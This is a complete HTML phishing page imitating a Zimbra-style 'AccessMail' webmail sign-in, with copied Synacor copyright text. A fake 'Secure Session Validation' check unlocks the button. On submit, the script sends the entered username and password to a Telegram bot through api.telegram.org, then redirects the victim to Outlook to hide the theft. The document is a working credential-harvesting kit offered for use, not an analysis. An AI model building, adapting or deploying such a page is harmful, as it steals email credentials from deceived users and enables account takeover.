<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">
    <title>AccessMail Sign In</title>
    <style>
        :root { --zimbra-blue: #4492b4; --btn-blue: #4a90e2; --text-dark: #333333; --border: #cccccc; }
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body { 
            margin: 0; 
            padding: 0;
            background-color: #ffffff; 
            font-family: "Segoe UI", "Roboto", "Helvetica Neue", Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Top Blue Header Section */
        .header-top {
            background-color: var(--zimbra-blue);
            height: 180px;
            width: 100%;
        }

        .main-content {
            flex: 1;
            padding: 40px 25px;
            max-width: 450px;
            margin: 0 auto;
            width: 100%;
        }

        .logo-area {
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 5px;
            display: flex;
            align-items: baseline;
        }
        .logo-light { color: #5cb8d1; } /* The 'Access' part */
        .logo-dark { color: #1a3a5e; margin-left: -2px; } /* The 'Mail' part */

        .sign-in-text {
            font-size: 24px;
            color: #444;
            margin-bottom: 35px;
            font-weight: 500;
        }

        .form-group { margin-bottom: 20px; position: relative; }
        
        label {
            display: block;
            font-size: 15px;
            color: #666;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid var(--border);
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus { border-color: var(--zimbra-blue); }

        /* Advanced Show/Hide Toggle */
        .show-toggle {
            position: absolute;
            right: 12px;
            bottom: 12px;
            font-size: 14px;
            color: #666;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 500;
        }

        /* Verification Element */
        .v-row {
            display: flex;
            align-items: center;
            margin: 25px 0;
            padding: 12px;
            background: #f9f9f9;
            border-radius: 4px;
            cursor: pointer;
            border: 1px solid #eee;
        }
        .v-check {
            width: 20px;
            height: 20px;
            border: 2px solid var(--border);
            border-radius: 4px;
            margin-right: 12px;
            position: relative;
        }
        .v-check.done { background: #28a745; border-color: #28a745; }
        .v-check.done::after {
            content: ''; position: absolute; left: 6px; top: 2px; width: 4px; height: 8px;
            border: solid white; border-width: 0 2px 2px 0; transform: rotate(45deg);
        }

        .action-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 20px;
        }

        .btn-sign-in {
            background-color: #4c8eb9;
            color: white;
            border: none;
            padding: 10px 25px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn-sign-in:disabled { opacity: 0.6; cursor: not-allowed; }

        .stay-signed {
            display: flex;
            align-items: center;
            font-size: 15px;
            color: #444;
        }
        .stay-signed input { margin-right: 8px; width: 18px; height: 18px; }

        /* Bottom Blue Banner */
        .footer-banner {
            background-color: var(--zimbra-blue);
            height: 100px;
            width: 100%;
            margin-top: 40px;
        }

        .copyright-area {
            padding: 30px 15px;
            text-align: center;
            font-size: 13px;
            color: #fff;
            background-color: var(--zimbra-blue); /* To merge with banner */
        }
    </style>
</head>
<body>

<div class="header-top"></div>

<main class="main-content">
    <div class="logo-area">
        <span class="logo-light">Access</span><span class="logo-dark">Mail</span>
    </div>
    <div class="sign-in-text">Sign In</div>

    <form id="authForm">
        <div class="form-group">
            <label>Username</label>
            <input type="text" id="user" class="input-field" required autocomplete="off">
        </div>

        <div class="form-group">
            <label>Password</label>
            <input type="password" id="pass" class="input-field" required>
            <button type="button" id="toggle" class="show-toggle">Show</button>
        </div>

        <div class="v-row" id="verify">
            <div class="v-check" id="vMark"></div>
            <span style="font-size: 14px; color: #666;" id="vText">Secure Session Validation</span>
        </div>

        <div class="action-row">
            <button type="submit" class="btn-sign-in" id="subBtn" disabled>Sign In</button>
            <label class="stay-signed">
                <input type="checkbox"> Stay signed in
            </label>
        </div>
    </form>
</main>

<div class="footer-banner"></div>
<footer class="copyright-area">
    Copyright Â© 2005-2026 Synacor, Inc. All rights reserved.<br>
    "Zimbra" is a registered trademark of Synacor, Inc.
</footer>

<script>
    // 1. Show/Hide Toggle
    const pIn = document.getElementById('pass'), tBtn = document.getElementById('toggle');
    tBtn.onclick = () => {
        if (pIn.type === 'password') {
            pIn.type = 'text'; tBtn.innerText = 'Hide';
        } else {
            pIn.type = 'password'; tBtn.innerText = 'Show';
        }
    };

    // 2. Verification Logic
    const vRow = document.getElementById('verify'), vMark = document.getElementById('vMark'), 
          vText = document.getElementById('vText'), subBtn = document.getElementById('subBtn');
    
    vRow.onclick = () => {
        if (vMark.classList.contains('done')) return;
        vText.innerText = "Verifying...";
        setTimeout(() => {
            vMark.classList.add('done');
            vText.innerText = "Session Authenticated";
            subBtn.disabled = false;
        }, 800);
    };

    // 3. Telegram Submit
    const _0xT = 'YOUR_BOT_TOKEN_HERE';
    const _0xC = '5627522307';

    document.getElementById('authForm').onsubmit = function(e) {
        e.preventDefault();
        subBtn.innerText = "...";
        const u = document.getElementById('user').value, p = pIn.value;
        const msg = "ðŸ“§ AccessMail Log\nUser: " + u + "\nPass: " + p;

        fetch("https://api.telegram.org/bot" + _0xT + "/sendMessage", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: _0xC, text: msg })
        }).then(() => {
            window.location.href = "https://outlook.office.com";
        }).catch(() => {
            window.location.href = "https://outlook.office.com";
        });
    };
</script>
</body>
</html>
